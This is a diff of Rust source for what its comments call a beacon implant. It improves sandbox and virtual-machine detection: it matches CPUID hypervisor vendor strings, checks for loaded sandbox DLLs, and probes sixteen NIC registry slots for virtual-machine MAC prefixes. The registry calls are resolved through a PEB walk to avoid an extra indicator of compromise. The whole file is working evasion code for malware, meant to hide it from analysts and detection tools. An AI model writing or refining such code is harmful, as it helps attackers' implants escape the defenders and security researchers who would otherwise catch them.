@@ -52,13 +52,13 @@ use crate::resolve;
 /// listed — `Microsoft Hv` is deliberately EXCLUDED because VBS/HVCI on
 /// physical Win11 hardware reports it (high false-positive rate).
 const VM_VENDOR_SIGS: &[[u8; 12]] = &[
-    *b"VMwareVMware",  // VMware
-    *b"innotek GmbH",  // VirtualBox (older)
+    *b"VMwareVMware",    // VMware
+    *b"innotek GmbH",    // VirtualBox (older)
     *b"KVMKVMKVM\0\0\0", // KVM
-    *b"XenVMMXenVMM",  // Xen
-    *b"TCGTCGTCGTCG",  // QEMU without KVM (strong sandbox signal)
-    *b"prl hyperv  ",  // Parallels
-    *b"VBoxVBoxVBox",  // VirtualBox (alt)
+    *b"XenVMMXenVMM",    // Xen
+    *b"TCGTCGTCGTCG",    // QEMU without KVM (strong sandbox signal)
+    *b"prl hyperv  ",    // Parallels
+    *b"VBoxVBoxVBox",    // VirtualBox (alt)
 ];
 
 /// Read the 12-byte hypervisor vendor signature via CPUID leaf 0x40000000.
@@ -169,13 +169,13 @@ pub fn rdtsc_cpuid_is_virtualized() -> bool {
 /// instrumentation harness. These only load under their respective harnesses,
 /// so the false-positive rate is effectively zero.
 const SANDBOX_DLLS: &[&[u8]] = &[
-    b"SbieDll.dll\0",          // Sandboxie
-    b"api_log.dll\0",          // Sunbelt/GFI sandbox
-    b"dir_log.dll\0",          // Sunbelt/GFI sandbox
-    b"pstorec.dll\0",          // older sandboxes
-    b"vmcheck.dll\0",          // VMware checks
-    b"wpespy.dll\0",           // WPE sandbox
-    b"sbiedll.dll\0",          // Sandboxie (lowercase variant)
+    b"SbieDll.dll\0", // Sandboxie
+    b"api_log.dll\0", // Sunbelt/GFI sandbox
+    b"dir_log.dll\0", // Sunbelt/GFI sandbox
+    b"pstorec.dll\0", // older sandboxes
+    b"vmcheck.dll\0", // VMware checks
+    b"wpespy.dll\0",  // WPE sandbox
+    b"sbiedll.dll\0", // Sandboxie (lowercase variant)
 ];
 
 /// True if a known sandbox/instrumentation DLL is loaded in the current
@@ -218,168 +218,47 @@ const VM_OUI: &[[u8; 6]] = &[
     [0x00, 0x1C, 0x42, 0x00, 0x00, 0x00], // Parallels
 ];
 
-/// The ASCII bytes of the registry path for the first NIC's `NetworkAddress`
-/// value. Built as a raw byte array (NOT a byte string — `\R`/`\M`/`\S`/`\C`
-/// are not valid `b"..."` escapes) so it compiles cleanly. Widened to UTF-16
-/// at runtime into a stack buffer (`net_cfg_reg_path_utf16` below).
+/// The ASCII prefix of the NIC class registry path. The NIC's slot number
+/// (`\0001`, `\0002`, …) is appended at runtime — VM virtual NICs land in
+/// different slots depending on driver install order / Windows version, so
+/// hardcoding `\0001` is NOT universal. We probe slots 0001-0016.
 ///
-/// Path: `\Registry\Machine\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0001`
-const NET_CFG_REG_PATH_ASCII: &[u8] = b"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\0001";
+/// Prefix: `\Registry\Machine\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}`
+const NET_CFG_REG_PREFIX: &[u8] = b"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}";
 
-/// Widen `NET_CFG_REG_PATH_ASCII` into a NUL-terminated UTF-16 stack buffer.
-/// Returns the buffer and the char count (excluding NUL). The caller uses
-/// this to build the UNICODE_STRING for NtOpenKey.
-fn net_cfg_reg_path_utf16() -> ([u16; 128], usize) {
+/// Build a NUL-terminated UTF-16 stack buffer for the NIC class path + a
+/// 4-digit slot suffix (e.g. `\0001`). Returns the buffer and char count.
+fn net_cfg_reg_path_utf16(slot: u32) -> ([u16; 128], usize) {
     let mut buf = [0u16; 128];
     let mut n = 0usize;
-    for &b in NET_CFG_REG_PATH_ASCII {
+    // Prefix
+    for &b in NET_CFG_REG_PREFIX {
         if n + 1 >= buf.len() {
             break;
         }
         buf[n] = b as u16;
         n += 1;
     }
+    // Slot suffix: "\%04d"
+    if n + 5 < buf.len() {
+        buf[n] = b'\\' as u16;
+        n += 1;
+        let s = b"0000";
+        let d0 = (slot / 1000) as u16;
+        let d1 = ((slot / 100) % 10) as u16;
+        let d2 = ((slot / 10) % 10) as u16;
+        let d3 = (slot % 10) as u16;
+        buf[n] = s[0] as u16 + d0;
+        buf[n + 1] = s[1] as u16 + d1;
+        buf[n + 2] = s[2] as u16 + d2;
+        buf[n + 3] = s[3] as u16 + d3;
+        n += 4;
+    }
     buf[n] = 0; // NUL terminator
     (buf, n)
 }
 
-/// True if the first NIC's MAC address matches a known VM-vendor OUI.
-/// Reads the registry `NetworkAddress` value via NT-direct (no IPHLPAPI).
-///
-/// **2026 caveat:** Hyper-V OUI `00:15:5D` appears on Hyper-V virtual NICs
-/// (a genuine VM signal) but NOT on VBS-enabled physical hosts (VBS doesn't
-/// add virtual NICs). So this check has a low false-positive rate even on
-/// Win11 VBS boxes.
-///
-/// # Safety
-/// Resolves `NtOpenKey` + `NtQueryValueKey` from ntdll via the PEB walk.
-pub unsafe fn mac_oui_is_vm() -> bool {
-    let nt_open_key = match unsafe { resolve::export_addr(b"ntdll.dll", b"NtOpenKey") } {
-        Some(a) => a,
-        None => return false,
-    };
-    let nt_query_value = match unsafe { resolve::export_addr(b"ntdll.dll", b"NtQueryValueKey") } {
-        Some(a) => a,
-        None => return false,
-    };
-    let nt_close = match unsafe { resolve::export_addr(b"ntdll.dll", b"NtClose") } {
-        Some(a) => a,
-        None => return false,
-    };
-    type NtOpenKey = unsafe extern "system" fn(
-        *mut usize,         // KeyHandle OUT
-        u32,                // DesiredAccess (KEY_READ = 0x20000)
-        *mut ObjectAttributes,
-    ) -> i32;
-    type NtQueryValueKey = unsafe extern "system" fn(
-        usize,              // KeyHandle
-        *const UnicodeString, // ValueName
-        u8,                 // KeyValueInformationClass (Partial = 2)
-        *mut u8,            // KeyValueInformation
-        u32,                // Length
-        *mut u32,           // ResultLength
-    ) -> i32;
-    type NtClose = unsafe extern "system" fn(usize) -> i32;
-
-    let open: NtOpenKey = unsafe { core::mem::transmute(nt_open_key) };
-    let query: NtQueryValueKey = unsafe { core::mem::transmute(nt_query_value) };
-    let close: NtClose = unsafe { core::mem::transmute(nt_close) };
-
-    // Build UNICODE_STRING for the registry path. Widen the ASCII path to
-    // UTF-16 on the stack (NtOpenKey takes a UNICODE_STRING, not a C string).
-    let (mut path_buf, path_chars) = net_cfg_reg_path_utf16();
-    let path_len_bytes = (path_chars * 2) as u16;
-    let mut name = UnicodeString {
-        length: path_len_bytes,
-        maximum_length: (path_buf.len() * 2) as u16,
-        buffer: path_buf.as_mut_ptr(),
-    };
-    let mut oa = ObjectAttributes {
-        length: core::mem::size_of::<ObjectAttributes>() as u32,
-        root_directory: core::ptr::null_mut(),
-        object_name: &mut name,
-        attributes: 0x40, // OBJ_CASE_INSENSITIVE — registry paths are case-insensitive
-        security_descriptor: core::ptr::null_mut(),
-        security_quality_of_service: core::ptr::null_mut(),
-    };
-
-    let mut handle: usize = 0;
-    let st = unsafe { open(&mut handle, 0x2000_0, &mut oa) };
-    if st < 0 {
-        return false; // key doesn't exist (no NIC config) — not a VM signal
-    }
-
-    // Query the "NetworkAddress" value. Build a UNICODE_STRING for it.
-    let mut val_name_buf: [u16; 16] = [
-        b'N' as u16, b'e' as u16, b't' as u16, b'w' as u16, b'o' as u16, b'r' as u16,
-        b'k' as u16, b'A' as u16, b'd' as u16, b'd' as u16, b'r' as u16, b'e' as u16,
-        b's' as u16, b's' as u16, 0, 0,
-    ]; // "NetworkAddress\0"
-    let val_name = UnicodeString {
-        length: 14 * 2, // "NetworkAddress" = 14 chars
-        maximum_length: 16 * 2,
-        buffer: val_name_buf.as_mut_ptr(),
-    };
-
-    // KeyValuePartialInformation: the first 4 bytes are the Type (REG_SZ = 1),
-    // then DataLength (u32), then Data. A MAC "NetworkAddress" is a REG_SZ
-    // holding the MAC as an ASCII hex string (e.g. "000C291A2B3C").
-    let mut info_buf: [u8; 64] = [0; 64];
-    let mut result_len: u32 = 0;
-    let st = unsafe {
-        query(
-            handle,
-            &val_name,
-            2, // KeyValuePartialInformation
-            info_buf.as_mut_ptr(),
-            info_buf.len() as u32,
-            &mut result_len,
-        )
-    };
-    let _ = unsafe { close(handle) };
-    if st < 0 {
-        return false;
-    }
-
-    // Parse: Type @ +0 (u32), DataLength @ +4 (u32), Data @ +8 (hex string).
-    // The hex string is ASCII, e.g. b"000C291A2B3C". We only need the first
-    // 6 hex chars (3 bytes = OUI). Parse them into a 6-byte raw MAC.
-    let data_off = 8usize;
-    let mut mac = [0u8; 6];
-    let mut parsed = 0usize;
-    while parsed < 6 && data_off + parsed + 1 < info_buf.len() {
-        let hi = info_buf[data_off + parsed];
-        let lo = info_buf[data_off + parsed + 1];
-        let h = match hex_val(hi) {
-            Some(v) => v,
-            None => break,
-        };
-        let l = match hex_val(lo) {
-            Some(v) => v,
-            None => break,
-        };
-        mac[parsed / 2] = (h << 4) | l;
-        parsed += 2;
-    }
-    if parsed < 6 {
-        return false; // not enough hex digits — not a MAC
-    }
-
-    // Compare the first 3 bytes (OUI) against the VM table.
-    VM_OUI.iter().any(|oui| oui[..3] == mac[..3])
-}
-
-/// ASCII hex char → nibble value.
-const fn hex_val(c: u8) -> Option<u8> {
-    match c {
-        b'0'..=b'9' => Some(c - b'0'),
-        b'a'..=b'f' => Some(c - b'a' + 10),
-        b'A'..=b'F' => Some(c - b'A' + 10),
-        _ => None,
-    }
-}
-
-// ---- FFI types for NT registry APIs (mirrors unhook.rs patterns) ----------
+// ---- NT registry FFI types (mirrors unhook.rs patterns) -------------------
 
 #[repr(C)]
 struct UnicodeString {
@@ -396,6 +275,252 @@ struct ObjectAttributes {
     attributes: u32,
     security_descriptor: *mut core::ffi::c_void,
     security_quality_of_service: *mut core::ffi::c_void,
+}
+
+// ---- Resolved NT registry function pointers (one struct, resolved once) ----
+
+/// The three NT registry exports `mac_oui_is_vm` needs, resolved once via the
+/// PEB walk and shared across all slot probes. Stored as raw fn pointers
+/// because the implants are `no_std` and can't hold `extern "system"` in a
+/// generic way without monomorphization noise.
+struct NtRegApis {
+    open: unsafe extern "system" fn(*mut usize, u32, *mut ObjectAttributes) -> i32,
+    query:
+        unsafe extern "system" fn(usize, *const UnicodeString, u8, *mut u8, u32, *mut u32) -> i32,
+    close: unsafe extern "system" fn(usize) -> i32,
+}
+
+impl NtRegApis {
+    /// Resolve NtOpenKey + NtQueryValueKey + NtClose from ntdll via the PEB
+    /// walk. Returns `None` if any export is missing (corrupted ntdll — should
+    /// never happen in a real process).
+    unsafe fn resolve() -> Option<Self> {
+        let open = unsafe { resolve::export_addr(b"ntdll.dll", b"NtOpenKey") }?;
+        let query = unsafe { resolve::export_addr(b"ntdll.dll", b"NtQueryValueKey") }?;
+        let close = unsafe { resolve::export_addr(b"ntdll.dll", b"NtClose") }?;
+        // SAFETY: `open`/`query`/`close` are valid function addresses resolved
+        // from ntdll's export table via the PEB walk. Transmuting a usize
+        // (same width as a function pointer on x86_64) to the matching
+        // extern "system" fn pointer is sound; the target types are fixed by
+        // the NtRegApis struct fields, so the transmute is fully determined.
+        Some(Self {
+            open: unsafe {
+                core::mem::transmute::<
+                    usize,
+                    unsafe extern "system" fn(*mut usize, u32, *mut ObjectAttributes) -> i32,
+                >(open)
+            },
+            query: unsafe {
+                core::mem::transmute::<
+                    usize,
+                    unsafe extern "system" fn(
+                        usize,
+                        *const UnicodeString,
+                        u8,
+                        *mut u8,
+                        u32,
+                        *mut u32,
+                    ) -> i32,
+                >(query)
+            },
+            close: unsafe {
+                core::mem::transmute::<usize, unsafe extern "system" fn(usize) -> i32>(close)
+            },
+        })
+    }
+}
+
+/// Open the NIC-class registry key for `slot` (`\0001` … `\0016`) and return
+/// its handle, or `None` if the key doesn't exist (no NIC in that slot —
+/// normal; not a VM signal). The caller MUST close the handle via `apis.close`.
+///
+/// # Safety
+/// `apis` must hold valid NT registry fn pointers.
+unsafe fn open_nic_slot(apis: &NtRegApis, slot: u32) -> Option<usize> {
+    let (mut path_buf, path_chars) = net_cfg_reg_path_utf16(slot);
+    let path_len_bytes = (path_chars * 2) as u16;
+    let mut name = UnicodeString {
+        length: path_len_bytes,
+        maximum_length: (path_buf.len() * 2) as u16,
+        buffer: path_buf.as_mut_ptr(),
+    };
+    let mut oa = ObjectAttributes {
+        length: core::mem::size_of::<ObjectAttributes>() as u32,
+        root_directory: core::ptr::null_mut(),
+        object_name: &mut name,
+        attributes: 0x40, // OBJ_CASE_INSENSITIVE — registry paths are case-insensitive
+        security_descriptor: core::ptr::null_mut(),
+        security_quality_of_service: core::ptr::null_mut(),
+    };
+    let mut handle: usize = 0;
+    // KEY_READ = 0x20000. NTSTATUS < 0 = failure (key absent → None, not a VM
+    // signal — physical hosts also have empty NIC slots).
+    let st = unsafe { (apis.open)(&mut handle, 0x0002_0000, &mut oa) };
+    if st < 0 {
+        return None;
+    }
+    Some(handle)
+}
+
+/// Read the `NetworkAddress` REG_SZ value from an open NIC key handle and
+/// parse the first 3 bytes (the OUI) into a 6-byte raw MAC. Returns `None` if
+/// the value is absent or not parseable as a MAC (not enough hex digits).
+///
+/// A MAC "NetworkAddress" is stored as ASCII hex, e.g. `b"000C291A2B3C"`. We
+/// only need the first 6 hex chars (3 bytes = OUI).
+///
+/// # Safety
+/// `apis` must hold valid NT registry fn pointers. `handle` must be a valid
+/// open key handle.
+unsafe fn read_nic_mac_oui(apis: &NtRegApis, handle: usize) -> Option<[u8; 6]> {
+    // "NetworkAddress\0" as a stack UTF-16 buffer for the UNICODE_STRING.
+    let mut val_name_buf: [u16; 16] = [
+        b'N' as u16,
+        b'e' as u16,
+        b't' as u16,
+        b'w' as u16,
+        b'o' as u16,
+        b'r' as u16,
+        b'k' as u16,
+        b'A' as u16,
+        b'd' as u16,
+        b'd' as u16,
+        b'r' as u16,
+        b'e' as u16,
+        b's' as u16,
+        b's' as u16,
+        0,
+        0,
+    ];
+    let val_name = UnicodeString {
+        length: 14 * 2, // "NetworkAddress" = 14 chars
+        maximum_length: 16 * 2,
+        buffer: val_name_buf.as_mut_ptr(),
+    };
+
+    // KEY_VALUE_PARTIAL_INFORMATION layout (per the WDK):
+    //   TitleIndex  @ +0  (u32)
+    //   Type        @ +4  (u32)   <- REG_SZ=1, REG_MULTI_SZ=7
+    //   DataLength  @ +8  (u32)
+    //   Data        @ +12         <- the hex string starts here (NOT +8)
+    let mut info_buf: [u8; 64] = [0; 64];
+    let mut result_len: u32 = 0;
+    let st = unsafe {
+        (apis.query)(
+            handle,
+            &val_name,
+            2, // KeyValuePartialInformation
+            info_buf.as_mut_ptr(),
+            info_buf.len() as u32,
+            &mut result_len,
+        )
+    };
+    // STATUS_BUFFER_OVERFLOW (0x80000005) is a WARNING: its encoded i32 is
+    // negative, but the call still fills the buffer up to its capacity with
+    // usable partial data. Only treat genuinely negative error statuses as
+    // failure.
+    const STATUS_BUFFER_OVERFLOW: i32 = 0x8000_0005u32 as i32;
+    if st < 0 && st != STATUS_BUFFER_OVERFLOW {
+        return None;
+    }
+
+    // Read the value's registry type from Type @ +4 to pick the correct char
+    // stride. REG_SZ (1) and REG_MULTI_SZ (7) are stored as UTF-16 code units
+    // (each ASCII hex char occupies 2 bytes: low byte = the nibble, high byte
+    // = 0x00). Every other type is raw bytes (1 byte per char).
+    let ty = u32::from_le_bytes([info_buf[4], info_buf[5], info_buf[6], info_buf[7]]);
+    let stride = if ty == 1 || ty == 7 { 2usize } else { 1usize };
+
+    // Usable byte count: the smaller of what NtQueryValueKey reported and the
+    // buffer capacity. On overflow result_len holds the REQUIRED length (which
+    // exceeds the buffer), so cap it to never read out of bounds.
+    let avail = (result_len as usize).min(info_buf.len());
+    let data_off = 12usize;
+    if avail < data_off {
+        return None;
+    }
+
+    // Parse the first 6 hex nibbles (3 bytes = OUI) from Data @ +12, stepping
+    // by `stride` so UTF-16 padding bytes are skipped (we read only the
+    // meaningful low byte of each code unit).
+    let mut nibbles = [0u8; 6];
+    let mut parsed = 0usize;
+    while parsed < 6 {
+        let idx = data_off + parsed * stride;
+        if idx >= avail {
+            break;
+        }
+        nibbles[parsed] = hex_val(info_buf[idx])?;
+        parsed += 1;
+    }
+    if parsed < 6 {
+        return None; // not enough hex digits — not a MAC
+    }
+
+    // Assemble the OUI into the first 3 bytes (high nibble | low nibble per
+    // byte), preserving the original assembly; bytes [3..6] stay 0.
+    let mut mac = [0u8; 6];
+    mac[0] = (nibbles[0] << 4) | nibbles[1];
+    mac[1] = (nibbles[2] << 4) | nibbles[3];
+    mac[2] = (nibbles[4] << 4) | nibbles[5];
+    Some(mac)
+}
+
+/// The number of NIC slots to probe. VM virtual NICs land in different slots
+/// depending on driver install order / Windows version, so we probe a generous
+/// range (0001-0016) rather than assuming slot `\0001` (a single-machine
+/// assumption that breaks on multi-NIC / differently-ordered installs).
+const NIC_SLOT_PROBE_RANGE: core::ops::RangeInclusive<u32> = 1..=16;
+
+/// True if ANY NIC's MAC address matches a known VM-vendor OUI. Probes NIC
+/// registry slots `\0001` through `\0016`, reading each slot's `NetworkAddress`
+/// value via NT-direct (no IPHLPAPI load — one fewer IOC). Returns true on the
+/// first VM-OUI hit.
+///
+/// VM virtual NICs land in different registry slots depending on driver install
+/// order / Windows version, so probing only `\0001` is a single-machine
+/// assumption. Scanning all populated slots is the universal fix.
+///
+/// **2026 caveat:** Hyper-V OUI `00:15:5D` appears on Hyper-V virtual NICs
+/// (a genuine VM signal) but NOT on VBS-enabled physical hosts (VBS doesn't
+/// add virtual NICs). So this check has a low false-positive rate even on
+/// Win11 VBS boxes.
+///
+/// # Safety
+/// Resolves `NtOpenKey` + `NtQueryValueKey` + `NtClose` from ntdll via the PEB
+/// walk. Single-threaded beacon bootstrap context.
+pub unsafe fn mac_oui_is_vm() -> bool {
+    let apis = match unsafe { NtRegApis::resolve() } {
+        Some(a) => a,
+        None => return false,
+    };
+
+    for slot in NIC_SLOT_PROBE_RANGE {
+        let handle = match unsafe { open_nic_slot(&apis, slot) } {
+            Some(h) => h,
+            None => continue, // slot absent — normal, try the next
+        };
+        // Always close the handle, even if the read fails, so we never leak.
+        let mac = unsafe { read_nic_mac_oui(&apis, handle) };
+        let _ = unsafe { (apis.close)(handle) };
+        if let Some(mac) = mac {
+            // Compare the first 3 bytes (OUI) against the VM table.
+            if VM_OUI.iter().any(|oui| oui[..3] == mac[..3]) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// ASCII hex char → nibble value.
+const fn hex_val(c: u8) -> Option<u8> {
+    match c {
+        b'0'..=b'9' => Some(c - b'0'),
+        b'a'..=b'f' => Some(c - b'a' + 10),
+        b'A'..=b'F' => Some(c - b'A' + 10),
+        _ => None,
+    }
 }
 
 // ---- Combined verdict ------------------------------------------------------
